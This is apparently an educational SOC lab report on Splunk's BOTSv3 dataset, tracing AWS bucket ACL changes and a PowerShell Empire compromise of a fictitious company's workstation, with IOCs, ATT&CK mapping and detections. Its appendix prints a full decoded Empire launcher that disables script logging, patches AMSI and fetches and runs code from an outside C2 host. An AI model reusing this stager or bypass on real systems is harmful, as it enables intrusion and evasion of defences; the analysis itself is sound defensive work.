# BOTSv3 SOC Investigation

> Educational lab using Splunk's public BOTSv3 dataset. This is not a real
> incident; "Frothly" is the fictitious company built into the dataset.
> Investigation performed independently in a self-hosted Splunk Enterprise
> (Docker) instance. See **Limitations** for where a public walkthrough was
> consulted, and for a data-quality issue discovered during the work.

## Executive Summary

Analysis of the BOTSv3 dataset (Splunk Enterprise, Docker, 2.8M events,
102 sourcetypes) identified two related security incidents on Frothly's
infrastructure, both occurring within roughly a 4.5-hour window on
2018-08-20 (UTC). On the cloud side, the AWS user `bstoll` modified the
ACL on the `frothlywebcode` S3 bucket twice from an IP address that, in
the same window, was also used for a corporate VPN session under a
different identity (`mkraeusen`) — a pattern consistent with either
shared office egress or credential/session reuse. On the endpoint side, a
Windows workstation (`FYODOR-L`) was compromised via a browser-delivered,
AMSI-evading PowerShell Empire launcher; the attacker used a documented
UAC-bypass technique (`fodhelper.exe`) to gain elevated privileges,
created a backdoor local administrator account (`svcvnc`), and
established command-and-control over HTTPS to `45.77.53.176`, with
beacon traffic also observed from a second host (`ABUNGST-L`), indicating
lateral spread. 13 ATT&CK techniques and 8 IOCs were extracted and mapped
to 5 detection queries suitable for a production SIEM.

## Methodology

1. Stood up Splunk Enterprise in Docker, ingested the BOTSv3 dataset
   (1.94M events / 107 sourcetypes at baseline), installed the Windows,
   Sysmon, AWS, O365, Unix, Stream, and CIM add-ons.
2. Ran orientation queries (`queries/q00-orientation.spl`) to map log
   sources, time range, and hosts before hunting (Step 4 of the lab
   guide).
3. Investigated two directions in depth: **Direction A (Cloud/AWS)** and
   **Direction B (Windows Endpoint)** — see `queries/q-a1-a4-cloudtrail.spl`
   and `queries/q-b1-b4-endpoint.spl`.
4. Followed a pivot loop for each finding: ask a question → write a
   query → record the result and a screenshot → extract a new IOC
   (IP/user/host) → pivot on that value across every sourcetype → repeat.
5. Mapped confirmed findings to MITRE ATT&CK and wrote detections
   (`queries/det-*.spl`) that would have caught each stage earlier.

## Data Quality Note — Timezone Discrepancy

Splunk's **Preferences → Time zone** was set to UTC at the start of the
investigation (per the lab guide), but the Splunk web UI was found to be
rendering `_time` in **America/New_York local time (UTC-4 / EDT)**
instead. This was discovered by comparing a Sysmon event's UI-displayed
`_time` against the unambiguous, `Z`-suffixed `TimeCreated SystemTime`
field inside its raw XML — the two were offset by exactly 4 hours in
every case checked.

**All timestamps in this report have been corrected to true UTC** by
adding 4 hours to the time originally shown in the Splunk UI. This does
not change the relative order or spacing of events, only their absolute
UTC label. This is called out explicitly because it is exactly the kind
of environment-setup error that would silently skew a real incident
timeline, and is captured as a lesson learned below.

## Timeline (UTC, 2018-08-20)

| Time (UTC) | Host / Actor | Event | Finding |
|---|---|---|---|
| 09:16:12 | `web_admin` (IP 35.153.154.221) | `CreateUser` + `CreateAccessKey` attempted → **AccessDenied** | F1 |
| 09:35:27 | `bstoll` (IP 157.97.121.132) | AWS Console login | F1 |
| 09:46:22 | `mkraeusen` (IP 107.77.212.175) | VPN WebVPN session established (clean auth) | F1 |
| 10:01:41 | `FYODOR-L` | `browser_broker.exe` spawns encoded PowerShell — initial access | F2 |
| 10:07:06 | `FYODOR-L` | `fodhelper.exe` UAC bypass (1st instance) | F2 |
| 10:08:17 | `FYODOR-L` | `net.exe` creates local account `svcvnc` (password `Password123!`) | F2 |
| 10:08:35 | `FYODOR-L` | `svcvnc` added to local **Administrators** group | F2 |
| 10:11:00 | `FYODOR-L` | Fileless execution via `IEX`, parent `svchost.exe` | F2 |
| 10:15:27 | `FYODOR-L` | WMI-based execution, parent `WmiPrvSE.exe` | F2 |
| 11:32:12 | `FYODOR-L` | `fodhelper.exe` UAC bypass (2nd instance) — payload downloaded via Edge, decoded and confirmed as a **PowerShell Empire** launcher | F2 |
| 13:01:46 | `bstoll` (IP 107.77.212.175) | `PutBucketAcl` on bucket `frothlywebcode` | F1 |
| 13:57:22 | `bstoll` (IP 107.77.212.175) | AWS Console login | F1 |
| 13:57:54 | `bstoll` (IP 107.77.212.175) | `PutBucketAcl` on `frothlywebcode` (2nd change) | F1 |
| — | `FYODOR-L` (3,849 conns) + `ABUNGST-L` (1,070 conns) | Sustained PowerShell beaconing to `45.77.53.176:443` (C2) | F2 |

## Findings

### F1 — Shared/reused IP across an AWS console session and a corporate VPN session

**What happened:** AWS user `bstoll` logged into the AWS Console and
twice modified the ACL on the `frothlywebcode` S3 bucket, both times from
IP `107.77.212.175`. In the same investigation window, that same IP was
independently used for a Cisco ASA `AnyConnect`/WebVPN session
authenticated as a *different* user, `mkraeusen`. A separate account,
`web_admin`, also attempted to create a new IAM user and access key from
a third IP (`35.153.154.221`) and was denied.

**Why it matters:** Repeated ACL changes to a production bucket are
exactly the kind of action that can silently flip a bucket from private
to public. One external IP being used across two different identities
and two different systems (AWS console + corporate VPN) is a pattern
that needs to be resolved to either "same person, same office egress"
(benign) or "shared/compromised credential" (not benign) — the
dataset alone cannot fully distinguish the two, which is why this is
flagged as high-priority rather than fully confirmed.

**Evidence:** `queries/q-a1-a4-cloudtrail.spl` (A1, A2), pivot queries
on `107.77.212.175` across `cisco:asa` and `ms:o365:management`.

**ATT&CK:** T1078 (Valid Accounts); T1136 (Create Account) for the
denied `web_admin` attempt (suspected only — the action was blocked).

**Not yet confirmed / next step:** whether the `PutBucketAcl` change
actually granted `AllUsers` (public) access — the raw event's
`requestParameters.AccessControlPolicy.AccessControlList.Grant{}.Grantee.URI`
field should be inspected directly to close this out.

### F2 — Full endpoint compromise of FYODOR-L via PowerShell Empire, with lateral spread

**What happened:** Workstation `FYODOR-L` (user `AzureAD\FyodorMalteskesko`)
was compromised through a browser-delivered payload. The attacker ran a
heavily obfuscated, base64-encoded PowerShell launcher that:

- Disabled AMSI (`amsiInitFailed = $true`) and PowerShell ScriptBlock
  logging, blinding Defender/AMSI to what followed;
- Called out over HTTPS to `https://45.77.53.176:443/admin/get.php`,
  sending a fixed auth cookie (`PthAVgs=bKQxpuOd5LPCjyfRC1BxPqQ8FWI=`)
  and a spoofed IE11 User-Agent string;
- Downloaded a payload and decrypted it in memory with a hardcoded RC4
  key before executing it via `IEX` — this exact stub (the
  version-check, AMSI patch, and RC4 decrypt-then-`IEX` pattern) is the
  documented launcher used by the **PowerShell Empire** post-exploitation
  framework (full decoded script in the Appendix).

Using the elevated context gained via a `fodhelper.exe` UAC bypass (used
twice, ~90 minutes apart), the attacker created a local account
`svcvnc` with a weak hardcoded password (`Password123!`) and immediately
added it to the local **Administrators** group — a backdoor account for
persistent access. Sustained PowerShell network activity was then
observed beaconing to the same C2 IP on port 443 from `FYODOR-L`
(3,849 connections) and, critically, from a second host, `ABUNGST-L`
(1,070 connections) — indicating the compromise spread beyond the
initial foothold. Two additional binaries were found masquerading as
legitimate Windows/IE components while running from `%TEMP%`
(`DismHost.exe` in a GUID-named folder, and a misspelled `iexplorer.exe`
under `Temp\unziped\lsof-master\`).

**Why it matters:** This is a complete, evidence-backed kill chain from
initial access through privilege escalation, persistence, defense
evasion, and command-and-control, with confirmed lateral movement to a
second host.

**Evidence:** `queries/q-b1-b4-endpoint.spl` (B1–B4), full raw event and
decoded payload in the Appendix.

**ATT&CK:** see the table below — 10 techniques map directly to this
finding.

## Indicators of Compromise (IOCs)

| # | IOC | Type | Context |
|---|---|---|---|
| 1 | `45.77.53.176` | IP | C2 server (PowerShell Empire), beaconed to on port 443 |
| 2 | `https://45.77.53.176:443/admin/get.php` | URL | Full C2 callback path |
| 3 | `PthAVgs=bKQxpuOd5LPCjyfRC1BxPqQ8FWI=` | HTTP cookie value | C2 auth/session cookie used by the Empire agent |
| 4 | `107.77.212.175` | IP | Shared between `bstoll` (AWS) and `mkraeusen` (VPN) sessions |
| 5 | `35.153.154.221` | IP | Source of `web_admin`'s denied `CreateUser`/`CreateAccessKey` |
| 6 | `svcvnc` / `Password123!` | Account | Backdoor local admin account created on FYODOR-L |
| 7 | `DismHost.exe` (in `%TEMP%\<GUID>\`) | File | Masquerading as legitimate Windows component |
| 8 | `iexplorer.exe` (in `Temp\unziped\lsof-master\`) | File | Misspelled masquerade of `iexplore.exe` |

## MITRE ATT&CK Mapping

| # | Finding | Tactic | Technique | ID | Confidence |
|---|---|---|---|---|---|
| 1 | `web_admin` CreateUser/CreateAccessKey denied | Persistence | Create Account | T1136 | Suspected (blocked, unconfirmed intent) |
| 2 | `bstoll` PutBucketAcl via shared IP | Initial Access / Persistence | Valid Accounts | T1078 | Confirmed |
| 3 | `browser_broker.exe` spawns encoded PowerShell | Execution | User Execution | T1204 | Confirmed |
| 4 | Base64-encoded PowerShell launcher | Defense Evasion | Obfuscated Files or Information | T1027 | Confirmed |
| 5 | `fodhelper.exe` spawned by elevated PowerShell | Privilege Escalation / Defense Evasion | Bypass User Account Control | T1548.002 | Confirmed |
| 6 | AMSI bypass + ScriptBlock logging disabled | Defense Evasion | Impair Defenses | T1562.001 | Confirmed |
| 7 | `net.exe` creates local account `svcvnc` | Persistence | Create Account: Local Account | T1136.001 | Confirmed |
| 8 | `svcvnc` added to Administrators group | Privilege Escalation | Account Manipulation | T1098 | Confirmed |
| 9 | PowerShell execution throughout | Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | Confirmed |
| 10 | `WmiPrvSE.exe` spawning PowerShell | Execution / Lateral Movement | Windows Management Instrumentation | T1047 | Confirmed |
| 11 | RC4-encrypted payload download + `IEX` | Command and Control | Application Layer Protocol: Web Protocols | T1071.001 | Confirmed |
| 12 | `DismHost.exe` / `iexplorer.exe` in Temp with legitimate-looking names | Defense Evasion | Masquerading | T1036 | Confirmed |
| 13 | Beaconing from FYODOR-L **and** ABUNGST-L to the same C2 | Lateral Movement | (inferred from C2 spread) | — | Suspected |

## Detection Recommendations

Each detection below was written from a confirmed finding, then tested
against the full dataset to check trigger accuracy and false-positive
rate. Full SPL, trigger conditions, and test results are in
`queries/det-*.spl`.

| # | Detection | Catches | ATT&CK |
|---|---|---|---|
| DET-01 | `queries/det-01-s3-public-acl.spl` | S3 bucket ACL changed to grant public (`AllUsers`) access | T1078 / T1098 |
| DET-02 | `queries/det-02-empire-launcher.spl` | Base64-encoded PowerShell launcher, decodes it inline | T1027 / T1059.001 |
| DET-03 | `queries/det-03-fodhelper-uac-bypass.spl` | `fodhelper.exe` spawned by PowerShell (UAC bypass) | T1548.002 |
| DET-04 | `queries/det-04-local-admin-account-creation.spl` | New local account created and elevated to Administrators in one short window | T1136.001 / T1098 |
| DET-05 | `queries/det-05-c2-beacon-volume.spl` | High-volume PowerShell beaconing to a single external IP/port | T1071.001 |

## Containment / Eradication / Recovery

If this were a live incident, the following actions follow directly
from the findings above:

**Containment**
- Isolate `FYODOR-L` and `ABUNGST-L` from the network (confirmed C2
  beaconing hosts).
- Disable the `svcvnc` local account on `FYODOR-L` immediately.
- Rotate/disable the AWS access key and console credentials for `bstoll`
  and `web_admin` pending investigation.
- Block `45.77.53.176` at the perimeter firewall/proxy.

**Eradication**
- Remove `svcvnc` and audit all local groups on `FYODOR-L` for any other
  unauthorized additions.
- Remove `DismHost.exe` and `iexplorer.exe` from the identified Temp
  paths; sweep the environment for the same file hashes/paths on other
  hosts.
- Revert the `frothlywebcode` bucket ACL to its known-good baseline and
  enable S3 access logging + versioning if not already on.

**Recovery**
- Re-image `FYODOR-L` rather than trust a cleaned host, given confirmed
  AMSI/logging tampering.
- Force credential reset (password + MFA re-enrollment) for `bstoll`,
  `web_admin`, and `mkraeusen`.
- Deploy DET-01 through DET-05 as standing correlation searches before
  reconnecting affected systems.

## Limitations

- **Timezone discrepancy:** see the Data Quality Note above — the
  Splunk UI rendered `_time` in America/New_York local time instead of
  UTC for the duration of the investigation, despite the timezone
  preference being set correctly. All timestamps in this report were
  corrected by +4 hours; this is flagged rather than silently fixed so
  the correction itself is auditable.
- **Index contamination:** the `Splunk Add-on for Unix and Linux` was
  installed as part of the standard add-on set and began collecting
  live `ps`/`top`/`lsof`/`netstat`/`PerfmonMk:Process` data from the
  Splunk host itself into the `botsv3` index. This inflated the raw
  event count (1.94M → 2.84M) and added a spurious tail of events
  through 2019. These sourcetypes were excluded from all findings and
  from the "true" BOTSv3 timeline, which is concentrated entirely on
  2018-08-20.
- **Not fully confirmed:** whether the `PutBucketAcl` change on
  `frothlywebcode` actually granted public access (the exact
  `Grantee.URI` was not inspected directly), and whether the shared IP
  in Finding 1 represents the same person on the same network or
  credential reuse — both are called out as next steps above rather
  than asserted.
- **Scope:** only two directions (Cloud/AWS and Windows Endpoint) were
  investigated in depth, per the lab's guidance to go deep rather than
  broad; Office 365, Linux/osquery, and full DNS/HTTP stream data were
  only pivoted into opportunistically, not hunted independently.
- **Walkthrough usage:** no public BOTSv3 walkthrough was consulted
  before or during this investigation; all queries, pivots, and
  conclusions above were independently derived.

## Repo Structure

```
botsv3-soc-investigation/
├── README.md                              <- this report
├── queries/
│   ├── q00-orientation.spl                <- Step 4 dataset mapping
│   ├── q-a1-a4-cloudtrail.spl             <- Direction A (Cloud/AWS)
│   ├── q-b1-b4-endpoint.spl               <- Direction B (Windows Endpoint)
│   ├── det-01-s3-public-acl.spl
│   ├── det-02-empire-launcher.spl
│   ├── det-03-fodhelper-uac-bypass.spl
│   ├── det-04-local-admin-account-creation.spl
│   └── det-05-c2-beacon-volume.spl
└── img/                                   <- screenshots referenced above
```

*(Dataset file `botsv3_data_set.tgz` intentionally not committed — see
[splunk/botsv3](https://github.com/splunk/botsv3) to reproduce.)*

## Appendix — Decoded PowerShell Empire Launcher

Extracted from a `fodhelper.exe`-spawning PowerShell process on
`FYODOR-L` (Sysmon EventCode 1, `CommandLine` containing `-enc`).
Decoded from base64 (UTF-16LE) and lightly reformatted for readability;
logic is unchanged from the raw decode.

```powershell
If ($PSVersionTable.PSVersion.Major -ge 3) {
    $GPF = [ref].Assembly.GetType('System.Management.Automation.Utils').
        "GetFie`ld"('cachedGroupPolicySettings','N'+'onPublic,Static')
    If ($GPF) {
        $GPC = $GPF.GetValue($Null)
        If ($GPC['ScriptB'+'lockLogging']) {
            $GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0
            $GPC['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0
        }
        $Val = [Collections.Generic.Dictionary[String,System.Object]]::New()
        $Val.Add('EnableScriptB'+'lockLogging',0)
        $Val.Add('EnableScriptBlockInvocationLogging',0)
        $GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging'] = $Val
    } Else {
        [ScriptBlock]."GetFie`ld"('signatures','N'+'onPublic,Static').
            SetValue($Null, (New-Object Collections.Generic.HashSet[string]))
    }
    # AMSI bypass
    $REF = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $REF.GetField('amsiInitFailed','NonPublic,Static').SetValue($Null, $True)
}

[System.Net.ServicePointManager]::Expect100Continue = 0
$wc = New-Object System.Net.WebClient
$u  = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
$wc.Headers.Add('User-Agent', $u)
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$Script:Proxy = $wc.Proxy

# RC4 key + implementation (Empire's standard stager RC4)
$K = [System.Text.Encoding]::ASCII.GetBytes('1AB<Yk6Z4#+vVu%o5}8&M-9UL~l|>0gP')
$R = {
    $D, $K = $ARGS
    $S = 0..255
    0..255 | % { $J = ($J + $S[$_] + $K[$_ % $K.Count]) % 256; $S[$_],$S[$J] = $S[$J],$S[$_] }
    $D | % { $I = ($I+1)%256; $H = ($H+$S[$I])%256; $S[$I],$S[$H]=$S[$H],$S[$I]; $_ -bxor $S[($S[$I]+$S[$H])%256] }
}

$ser = 'https://45.77.53.176:443'
$t   = '/admin/get.php'
$wc.Headers.Add('Cookie', 'PthAVgs=bKQxpuOd5LPCjyfRC1BxPqQ8FWI=')
$datA = $wc.DownloadData($ser + $t)
$iv   = $datA[0..3]
$datA = $datA[4..($datA.Length)]
-Join [Char[]](& $R $datA ($IV + $K)) | IEX
```

**What it does, in order:**
1. Disables PowerShell ScriptBlock logging and patches
   `AmsiUtils.amsiInitFailed = $true`, blinding AMSI/Defender to
   everything that follows.
2. Configures a `WebClient` with a spoofed IE11 User-Agent and disables
   TLS certificate validation.
3. Requests `https://45.77.53.176:443/admin/get.php` with a fixed
   session cookie.
4. RC4-decrypts the response using a hardcoded key and a 4-byte IV taken
   from the start of the response, then pipes the decrypted stage-2
   payload directly into `IEX` for in-memory execution.

This is the documented launcher stub used by the **PowerShell Empire**
post-exploitation framework (or a close derivative) — the version-gate,
AMSI patch, and RC4-decrypt-then-`IEX` sequence are its signature
pattern, not custom-written malware.
